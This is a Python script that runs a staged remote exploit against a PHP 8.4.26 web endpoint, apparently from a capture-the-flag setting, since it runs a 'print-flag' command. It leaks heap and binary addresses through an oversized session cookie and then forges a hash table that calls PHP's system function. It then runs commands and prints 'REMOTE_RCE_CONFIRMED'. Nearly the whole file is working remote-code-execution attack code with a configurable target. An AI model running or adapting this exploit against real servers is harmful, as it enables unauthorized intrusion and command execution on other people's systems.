#!/usr/bin/env python3

from __future__ import annotations

import argparse
from dataclasses import dataclass
from datetime import datetime, timezone
import http.client
from pathlib import Path
import secrets
import time

import exploit_primitives as exploit
from exploit_chain import OOM_MARKER, PayloadError, PayloadSet, ensure_request_size
from http_transport import HttpRequest, HttpResponse, HttpTarget, PersistentHttpClient

@dataclass(frozen=True, slots=True)
class RemoteProofConfig:
    target: HttpTarget
    endpoint: str
    readiness_path: str
    expected_version: str
    profile: exploit.PhpBinaryProfile
    attempts: int
    timeout: float
    retry_delay: float
    leak_length: int
    pre_parameters: int
    b1_fillers: tuple[int, ...]
    worker_stride: int
    use_proxy: bool
    pipelined: bool
    proof_log: Path
    leak_file: Path

@dataclass(frozen=True, slots=True)
class RemoteProof:
    attempt: int
    leak: exploit.AddressLeak
    statuses: tuple[int, ...]
    output: bytes

class RemoteProofError(RuntimeError):
    pass

class RemoteProofRunner:
    def __init__(self, config: RemoteProofConfig):
        self.config = config
        self.payloads = PayloadSet.create()
        self.transcript: list[str] = []
        self.php_base: int | None = None

    def run(self) -> None:
        self.config.proof_log.unlink(missing_ok=True)
        self.config.leak_file.unlink(missing_ok=True)
        self.payloads.validate()
        self.transcript = [
            "REMOTE php2shell proof",
            "utc=" + datetime.now(timezone.utc).isoformat(),
            "target=" + self.config.target.origin + self.config.endpoint,
            "profile=" + self.config.profile.name,
            self.payloads.size_line(),
        ]
        for attempt in range(1, self.config.attempts + 1):
            try:
                proof = self.run_attempt(attempt)
            except (ConnectionError, OSError, RuntimeError, http.client.HTTPException) as error:
                fillers = self.config.b1_fillers[(attempt - 1) % len(self.config.b1_fillers)]
                print(f"attempt={attempt} b1_fillers={fillers} failed: {error}", flush=True)
                time.sleep(self.config.retry_delay)
                continue
            self.complete(proof)
            return
        raise RemoteProofError(f"no validated callback after {self.config.attempts} attempts")

    def run_attempt(self, attempt: int) -> RemoteProof:
        nonce = secrets.token_hex(8)
        command = f"echo {nonce};id;echo {nonce}-flag;print-flag&&echo {nonce}-end".encode()
        query = "&".join(f"q{index:04d}=v" for index in range(self.config.pre_parameters))
        fillers = self.config.b1_fillers[(attempt - 1) % len(self.config.b1_fillers)]
        a1_path = self.config.endpoint + "?" + query
        b1_path = self.config.endpoint + "?" + exploit.b1_query(self.config.leak_length, fillers)
        with PersistentHttpClient(self.config.target, self.config.timeout, self.config.use_proxy) as client:
            leak_stages = (
                HttpRequest.post(self.config.endpoint, self.payloads.seed, exploit.BOUNDARY),
                HttpRequest.get(self.config.readiness_path),
                HttpRequest.post(a1_path, self.payloads.a1, b"C"),
                HttpRequest.post(b1_path, self.payloads.b1, exploit.BOUNDARY),
            )
            seed, readiness, a1, b1 = self.exchange(client, leak_stages)
            require_oom("seed", seed)
            require_readiness(readiness, self.config.expected_version)
            require_oom("A1", a1)
            require_oom("B1", b1)
            cookie = b1.session_cookie()
            if len(cookie) != self.config.leak_length:
                raise RemoteProofError(f"B1 returned a {len(cookie)}-byte session cookie")
            self.config.leak_file.write_bytes(cookie)
            self.config.leak_file.chmod(0o600)
            heaps, pies = exploit.collect_pointer_candidates(cookie)
            main_chunk = exploit.resolve_main_chunk(heaps)
            try:
                self.php_base = exploit.resolve_php_base(pies, self.config.profile)
            except RuntimeError:
                if self.php_base is None:
                    raise RemoteProofError(f"partial leak has heap {main_chunk:#x} but no PHP anchor") from None
            leak = exploit.AddressLeak(main_chunk, self.php_base, self.config.profile.zif_system_offset)
            b2_body = exploit.build_b2(leak.fake_hash_table, leak.zif_system, command)
            ensure_request_size("B2", b2_body)
            callback_stages = (
                HttpRequest.post(self.config.endpoint, self.payloads.a2, exploit.BOUNDARY),
                HttpRequest.post(self.config.endpoint, b2_body, exploit.BOUNDARY, True),
            )
            a2, b2 = self.exchange(client, callback_stages)
            require_oom("A2", a2)
        output = validate_callback(b2, nonce)
        statuses = seed.status, readiness.status, a1.status, b1.status, a2.status, b2.status
        return RemoteProof(attempt, leak, statuses, output)

    def exchange(self, client: PersistentHttpClient, stages: tuple[HttpRequest, ...]) -> tuple[HttpResponse, ...]:
        requests: list[HttpRequest] = []
        indices: list[int] = []
        for index, stage in enumerate(stages):
            indices.append(len(requests))
            requests.append(stage)
            if index < len(stages) - 1:
                requests.extend(HttpRequest.get(self.config.readiness_path) for _ in range(self.config.worker_stride - 1))
        if self.config.pipelined:
            responses = client.pipeline(tuple(requests))
        else:
            responses = tuple(client.pipeline((request,))[0] for request in requests)
        return tuple(responses[index] for index in indices)

    def complete(self, proof: RemoteProof) -> None:
        statuses = "/".join(str(status) for status in proof.statuses)
        address_line = f"main={proof.leak.main_chunk:#x} php={proof.leak.php_base:#x} zif_system={proof.leak.zif_system:#x}"
        self.transcript.extend(
            (
                f"attempt={proof.attempt} statuses={statuses}",
                address_line,
                "response=" + proof.output.decode("utf-8", "backslashreplace").strip(),
                "RESULT=REMOTE_RCE_CONFIRMED",
            )
        )
        self.config.proof_log.write_text("\n".join(self.transcript) + "\n", encoding="utf-8")
        print(self.transcript[-4], flush=True)
        print(address_line, flush=True)
        print(self.transcript[-2], flush=True)
        print("RESULT=REMOTE_RCE_CONFIRMED", flush=True)
        print(f"proof_log={self.config.proof_log}", flush=True)

def require_oom(stage: str, response: HttpResponse) -> None:
    if OOM_MARKER not in response.body:
        raise RemoteProofError(f"{stage} OOM was not observed (HTTP {response.status}, {len(response.body)} bytes)")

def require_readiness(response: HttpResponse, expected_version: str) -> None:
    marker = ("PHP " + expected_version).encode()
    if response.status != 200 or marker not in response.body:
        raise RemoteProofError(f"readiness check failed (HTTP {response.status})")

def validate_callback(response: HttpResponse, nonce: str) -> bytes:
    start = nonce.encode()
    flag_marker = (nonce + "-flag").encode()
    end = (nonce + "-end").encode()
    if response.status != 200 or start not in response.body or flag_marker not in response.body or end not in response.body:
        raise RemoteProofError(f"B2 callback was not verified (HTTP {response.status}, {len(response.body)} bytes)")
    output = response.body.split(start, 1)[1].split(end, 1)[0]
    identity, flag = output.split(flag_marker, 1)
    identity = identity.strip()
    flag = flag.strip()
    if b"uid=" not in identity or not flag:
        raise RemoteProofError("B2 callback did not include identity and print-flag output")
    return identity + b"\n" + flag

def integer(value: str) -> int:
    return int(value, 0)

def integer_list(value: str) -> tuple[int, ...]:
    values = tuple(integer(part.strip()) for part in value.split(",") if part.strip())
    if not values:
        raise ValueError("integer list cannot be empty")
    return values

def parse_config() -> RemoteProofConfig:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://old.stealmybitcoin.com")
    parser.add_argument("--endpoint", default="/ping.php")
    parser.add_argument("--readiness-path", default="/php-version.php")
    parser.add_argument("--expected-version", default="8.4.26")
    parser.add_argument("--profile", choices=tuple(exploit.PHP_BINARY_PROFILES), default="alpine")
    parser.add_argument("--attempts", type=int, default=20)
    parser.add_argument("--timeout", type=float, default=45)
    parser.add_argument("--retry-delay", type=float, default=0.5)
    parser.add_argument("--leak-length", type=integer, default=0x440)
    parser.add_argument("--pre-parameters", type=int, default=8)
    parser.add_argument("--b1-fillers", type=integer_list, default=(5, 6, 2, 7))
    parser.add_argument("--worker-stride", type=int, default=1)
    parser.add_argument("--direct", action="store_true")
    parser.add_argument("--sequential", action="store_true")
    parser.add_argument("--proof-log", type=Path, default=Path(__file__).resolve().with_name("remote-proof.log"))
    parser.add_argument("--leak-file", type=Path, default=Path(__file__).resolve().with_name("remote-leak.bin"))
    arguments = parser.parse_args()
    if arguments.attempts < 1 or arguments.pre_parameters < 0 or any(value < 0 for value in arguments.b1_fillers) or arguments.worker_stride < 1 or arguments.timeout <= 0 or arguments.retry_delay < 0:
        parser.error("attempts, timeout, retry delay, and pre-parameter count must be valid")
    return RemoteProofConfig(
        HttpTarget.parse(arguments.target),
        arguments.endpoint,
        arguments.readiness_path,
        arguments.expected_version,
        exploit.PHP_BINARY_PROFILES[arguments.profile],
        arguments.attempts,
        arguments.timeout,
        arguments.retry_delay,
        arguments.leak_length,
        arguments.pre_parameters,
        arguments.b1_fillers,
        arguments.worker_stride,
        not arguments.direct,
        not arguments.sequential,
        arguments.proof_log,
        arguments.leak_file,
    )

def main() -> int:
    try:
        RemoteProofRunner(parse_config()).run()
    except (OSError, PayloadError, RemoteProofError, ValueError) as error:
        raise SystemExit(str(error)) from None
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
